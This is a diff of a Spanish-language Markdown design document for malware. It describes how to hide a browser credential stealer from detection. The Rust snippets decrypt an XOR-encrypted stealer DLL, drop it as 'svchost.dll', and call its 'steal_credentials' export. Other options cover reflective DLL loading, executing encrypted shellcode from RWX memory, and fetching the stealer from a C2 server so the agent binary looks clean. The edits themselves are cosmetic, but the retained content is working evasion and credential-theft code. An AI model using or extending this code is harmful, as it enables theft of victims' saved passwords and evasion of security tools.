@@ -39,10 +39,10 @@ En lugar de tener el código de stealer directamente en el binario, lo encriptam
 ## Opción 1: DLL Encriptada en Recursos (RECOMENDADA)
 
 ### Ventajas
-- ✅ Más simple de implementar
-- ✅ No requiere shellcode injection complejo
-- ✅ Payload completamente oculto hasta ejecución
-- ✅ Fácil de actualizar (solo cambiar DLL encriptada)
+-  Más simple de implementar
+-  No requiere shellcode injection complejo
+-  Payload completamente oculto hasta ejecución
+-  Fácil de actualizar (solo cambiar DLL encriptada)
 
 ### Implementación
 
@@ -116,37 +116,37 @@ fn decrypt_payload(encrypted: &[u8], key: &[u8]) -> Vec<u8> {
 fn steal_browser_credentials() -> String {
     // 1. Desencriptar DLL
     let dll_bytes = decrypt_payload(ENCRYPTED_PAYLOAD, XOR_KEY);
-    
+
     // 2. Cargar DLL desde memoria
     let dll_handle = unsafe {
         let temp_path = std::env::temp_dir().join("svchost.dll");
         std::fs::write(&temp_path, &dll_bytes).unwrap();
-        
+
         let dll = libloading::Library::new(&temp_path).unwrap();
         std::fs::remove_file(&temp_path).ok(); // Eliminar archivo temporal
         dll
     };
-    
+
     // 3. Ejecutar función de stealer
     let result = unsafe {
-        let steal_fn: libloading::Symbol<extern "C" fn() -> *mut c_char> = 
+        let steal_fn: libloading::Symbol<extern "C" fn() -> *mut c_char> =
             dll_handle.get(b"steal_credentials").unwrap();
-        
+
         let ptr = steal_fn();
         let cstr = CStr::from_ptr(ptr);
         let result = cstr.to_string_lossy().to_string();
-        
+
         // Liberar memoria
-        let free_fn: libloading::Symbol<extern "C" fn(*mut c_char)> = 
+        let free_fn: libloading::Symbol<extern "C" fn(*mut c_char)> =
             dll_handle.get(b"free_string").unwrap();
         free_fn(ptr);
-        
+
         result
     };
-    
+
     // 4. Cerrar DLL
     drop(dll_handle);
-    
+
     // 5. Formatear respuesta
     let encoded = base64_encode(result.as_bytes());
     format!("__CREDENTIALS_B64__:{}{}", encoded, DELIMITER)
@@ -158,9 +158,9 @@ fn steal_browser_credentials() -> String {
 ## Opción 2: Reflective DLL Injection (AVANZADA)
 
 ### Ventajas
-- ✅ DLL **nunca toca el disco**
-- ✅ Completamente en memoria
-- ✅ Más sigiloso
+-  DLL **nunca toca el disco**
+-  Completamente en memoria
+-  Más sigiloso
 
 ### Implementación
 ```rust
@@ -175,20 +175,20 @@ fn load_dll_from_memory(dll_bytes: &[u8]) -> Result<HMODULE, Error> {
             MEM_COMMIT | MEM_RESERVE,
             PAGE_EXECUTE_READWRITE,
         );
-        
+
         // 2. Copiar DLL a memoria
         std::ptr::copy_nonoverlapping(
             dll_bytes.as_ptr(),
             base as *mut u8,
             dll_bytes.len(),
         );
-        
+
         // 3. Parse PE headers y relocations
         // ... (complejo, usar crate como memorymodule)
-        
+
         // 4. Ejecutar DllMain
         // ...
-        
+
         Ok(base as HMODULE)
     }
 }
@@ -202,9 +202,9 @@ fn load_dll_from_memory(dll_bytes: &[u8]) -> Result<HMODULE, Error> {
 Compilar `stealer` a shellcode posición-independiente y encriptarlo.
 
 ### Ventajas
-- ✅ No necesita DLL
-- ✅ Payload muy pequeño
-- ✅ Fácil de encriptar/desencriptar
+-  No necesita DLL
+-  Payload muy pequeño
+-  Fácil de encriptar/desencriptar
 
 ### Builder genera:
 ```rust
@@ -224,7 +224,7 @@ fn compile_stealer_to_shellcode() -> Vec<u8> {
         .current_dir("../stealer-dll")
         .status()
         .unwrap();
-    
+
     // 2. Extraer .text section (código ejecutable)
     let dll = std::fs::read("../stealer-dll/target/release/stealer.dll").unwrap();
     extract_text_section(&dll)
@@ -243,7 +243,7 @@ fn encrypt_shellcode(shellcode: &[u8], key: &[u8]) -> Vec<u8> {
 fn execute_encrypted_shellcode() {
     // 1. Desencriptar
     let shellcode = decrypt_payload(ENCRYPTED_SHELLCODE, XOR_KEY);
-    
+
     // 2. Allocar memoria ejecutable
     let mem = unsafe {
         VirtualAlloc(
@@ -253,7 +253,7 @@ fn execute_encrypted_shellcode() {
             PAGE_EXECUTE_READWRITE,
         )
     };
-    
+
     // 3. Copiar shellcode
     unsafe {
         std::ptr::copy_nonoverlapping(
@@ -262,11 +262,11 @@ fn execute_encrypted_shellcode() {
             shellcode.len(),
         );
     }
-    
+
     // 4. Ejecutar
     let func: extern "C" fn() -> *mut c_char = unsafe { std::mem::transmute(mem) };
     let result = func();
-    
+
     // 5. Liberar memoria
     unsafe { VirtualFree(mem, 0, MEM_RELEASE); }
 }
@@ -301,7 +301,7 @@ const KEY: &[u8] = b"random_key";
 fn steal_chromium_encrypted() -> Vec<Credential> {
     // Desencriptar código
     let code = decrypt(ENCRYPTED_STEAL_CHROMIUM, KEY);
-    
+
     // Ejecutar dinámicamente
     unsafe { execute_code(&code) }
 }
@@ -346,26 +346,26 @@ Si querés algo **ultra simple**:
 fn steal_browser_credentials() -> String {
     // 1. Pedir payload encriptado al C2
     let encrypted_dll = download_from_c2("GET_STEALER_DLL");
-    
+
     // 2. Desencriptar
     let dll = decrypt_xor(&encrypted_dll, XOR_KEY);
-    
+
     // 3. Ejecutar
     let result = execute_dll_from_memory(&dll);
-    
+
     // 4. Enviar resultado
     result
 }
 ```
 
 **Ventajas**:
-- ✅ Agent.exe es 100% limpio (0 KB de código malicioso)
-- ✅ Payload se descarga solo cuando se usa
-- ✅ Fácil de actualizar (cambiar payload en servidor)
+-  Agent.exe es 100% limpio (0 KB de código malicioso)
+-  Payload se descarga solo cuando se usa
+-  Fácil de actualizar (cambiar payload en servidor)
 
 **Desventajas**:
-- ❌ Requiere conexión al C2 activa
-- ❌ Tráfico de red sospechoso
+-  Requiere conexión al C2 activa
+-  Tráfico de red sospechoso
 
 ---
 
